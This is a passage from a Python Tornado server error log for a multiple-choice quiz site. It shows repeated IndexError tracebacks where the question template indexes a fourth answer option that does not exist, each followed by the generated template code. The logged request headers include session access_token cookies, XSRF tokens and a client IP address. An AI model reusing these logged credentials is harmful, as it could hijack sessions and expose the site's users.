 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059f49c8e4c85480ff4f8c1&answers=%5B0%5D&cursor=16&_xsrf=1cb4017f52d340adab7690f63513f0a2', headers={'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '89.105.120.34', 'Origin': 'http://www.intheory.co.uk', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFNN1A1OVZtZU5zN2YyOTdOeWNEOHZ0ejYyb3ZaQnExdWJIdHlUMDZVbUMyYXpvU1VxRXpWV1ZrNUhrOEo4VFZJRU0wWkFPampPeWFxNW5vSnkzWkNFZ1pBeEgwRXdaRFpE|1348052806|3985d8d1466122be97d1521ce5e9e02404b570f3; _xsrf=1cb4017f52d340adab7690f63513f0a2; __utma=188782963.2051100369.1348052782.1348052782.1348070864.2; __utmb=188782963.12.10.1348070864; __utmc=188782963; __utmz=188782963.1348052782.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 153.89ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059f49c8e4c85480ff4f8c1&answers=%5B2%5D&cursor=18&_xsrf=1cb4017f52d340adab7690f63513f0a2', headers={'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '89.105.120.34', 'Origin': 'http://www.intheory.co.uk', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFNN1A1OVZtZU5zN2YyOTdOeWNEOHZ0ejYyb3ZaQnExdWJIdHlUMDZVbUMyYXpvU1VxRXpWV1ZrNUhrOEo4VFZJRU0wWkFPampPeWFxNW5vSnkzWkNFZ1pBeEgwRXdaRFpE|1348052806|3985d8d1466122be97d1521ce5e9e02404b570f3; _xsrf=1cb4017f52d340adab7690f63513f0a2; __utma=188782963.2051100369.1348052782.1348052782.1348070864.2; __utmb=188782963.12.10.1348070864; __utmc=188782963; __utmz=188782963.1348052782.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 98.68ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059f3948e4c854802b2dbc3&answers=%5B0%5D&cursor=17&_xsrf=11cac5be243b43cea91e403e51c6a2c4', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8,fr;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '89.105.120.34', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFLOXBwRFpDekVHdTRISGJsWElvMWlONTdFa3IydmlKQzkxRHRHUXk2OGo3TG1idmx3NU5IRHlRWkEyMDZ0SHltWkNrSlFaQTZiT0RXNVlQVURnWkQ=|1348071970|5ad04f2838496896e2949f74560fd9295dc1e1c3"; _xsrf=11cac5be243b43cea91e403e51c6a2c4; __utma=188782963.779422263.1348071853.1348071853.1348071853.1; __utmb=188782963.9.10.1348071853; __utmc=188782963; __utmz=188782963.1348071853.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 251.44ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
